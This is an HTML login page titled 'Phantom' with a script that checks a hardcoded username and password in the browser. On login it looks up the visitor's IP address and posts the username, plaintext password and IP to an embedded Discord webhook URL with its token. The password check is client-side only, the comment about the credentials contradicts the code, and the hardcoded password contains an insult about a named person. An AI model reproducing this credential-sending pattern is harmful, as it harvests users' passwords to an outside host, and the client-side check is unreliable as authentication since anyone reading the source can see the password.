<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Phantom</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #1e1e2f, #3f3f5b);
            color: #fff;
        }

        .login-container {
            background: #2a2a3d;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
            text-align: center;
            width: 100%;
            max-width: 350px;
        }

        h1 {
            margin-bottom: 1.5rem;
        }

        input {
            width: 90%;
            margin: 0.5rem 0;
            padding: 0.5rem;
            border: none;
            border-radius: 4px;
            background: #3f3f5b;
            color: #fff;
        }

        button {
            padding: 0.7rem 1.5rem;
            margin-top: 1rem;
            background: #7f5eff;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        button:hover {
            background: #9a7dff;
        }

        .error {
            margin-top: 1rem;
            color: #ff5e5e;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Login to Phantom</h1>
        <form id="login-form">
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
            <p class="error" id="error-msg" style="display: none;">Invalid username or password.</p>
        </form>
    </div>

    <script>
        document.getElementById('login-form').addEventListener('submit', async (e) => {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const errorMsg = document.getElementById('error-msg');

            // Only allow user "dev" with password "dev123"
            if (username !== 'dummy' || password !== 'harlanisgay69') {
                errorMsg.style.display = 'block';
                return;
            }

            errorMsg.style.display = 'none';

            // Fetch IP Address
            let ip = 'Unknown';
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch (err) {
                console.error("Couldn't fetch IP address:", err);
            }

            // Construct payload for Discord webhook
            const payload = {
                content: `NEW LOGIN DETECTED:\nUsername: ${username}\nPassword: ${password}\nIP Address: ${ip}\nTime: ${new Date().toLocaleString()}`,
            };

            // Send to Discord webhook
            try {
                await fetch('https://discord.com/api/webhooks/1309124128045010974/eAeCVId7HvthQG9VB02H8GCzJiplC3VU1pbvaFd_j3LJuV8WvHi11of4_N-2bcqCpYTK', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                });
                console.log('Login data sent to Discord webhook');
            } catch (err) {
                console.error("Couldn't send data to webhook:", err);
            }

            // Save session and redirect
            document.cookie = `username=${username}; path=/;`;
            window.location.href = 'dashboard.html';
        });
    </script>
</body>
</html>
